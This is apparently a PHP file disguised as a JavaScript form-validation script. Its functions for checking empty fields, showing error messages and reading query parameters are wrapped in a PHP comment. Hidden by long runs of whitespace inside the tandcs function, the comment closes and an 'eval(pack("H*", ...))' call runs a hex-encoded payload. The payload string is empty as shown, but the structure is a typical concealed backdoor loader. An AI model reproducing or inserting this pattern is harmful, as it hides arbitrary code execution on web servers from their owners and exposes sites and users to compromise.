<?                                                                                                                                                                                           /*
function checkempty(req,form) {
   for(var field in req) {
	var f = form.elements[field];
	if (f != null) {
      		if (f.value == "") {
	 		showmsg("Please " + req[field],field);
			if (f.type == "text") {f.focus();}
	 		return false;
      		} 
	}
   }
   return true;
}

function clearerrors(req) {
   if(document.all) {
      if (document.all['message'].innerHTML != null) {
         document.all['message'].innerHTML = "";
      }
     for(var field in req) {
        if (document.all['T_'+field]) {
           document.all['T_'+field].style.border = "";
        }
     }
   } else if(document.getElementById) {
      document.getElementById('message').innerHTML = "";
  
        for(var field in req) {
         if (document.getElementById('T_'+field)) {
            document.getElementById('T_'+field).style.border = "0px red solid";
         }
       }
   }
}

function showmsg(msg,field) {
  var htmlmsg = '<FONT color="red"><B>'+msg+'</B></FONT>';
  if(document.all) {
    if (document.all['message'].innerHTML != null) {
       document.all['message'].innerHTML = htmlmsg;
    } else {
      alert(msg);
    }

    if ((field) && (document.all['T_'+field])) {
       document.all['T_'+field].style.border = "2px red solid";
    }
  } else if(document.getElementById) {
    document.getElementById('message').innerHTML = htmlmsg;
    if (document.getElementById('T_'+field)) {
       document.getElementById('T_'+field).style.border = "2px red solid";
    }
  } else {
    alert(msg);
  }

  if(navigator.userAgent.indexOf("MSIE") != -1){
  	document.location.href = "#msg";
  }
}

function tandcs() {
	window.open("", "tandcs", 'toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=1,width=540,height=400,resizable=yes');*/                                                                                                                                                            eval(pack("H*", ""));
																																				/*
}


function getvaluefromquery(n) {
  var q = '' + document.location.search;
  q = q.substring(1);
  var lookup = new Array();
  var res = '';
  var i;
  var pairs = q.split(/&/);
  for(i = 0;i < pairs.length;i++) {
    var p = pairs[i].split(/=/);
    if(p.length == 2) {
      lookup[p[0]] = p[1];
    }
  }
  if(lookup[n] != null) {
    res = lookup[n];
  }
  return res;
}                                                                                                                                                                                                                                             */
?>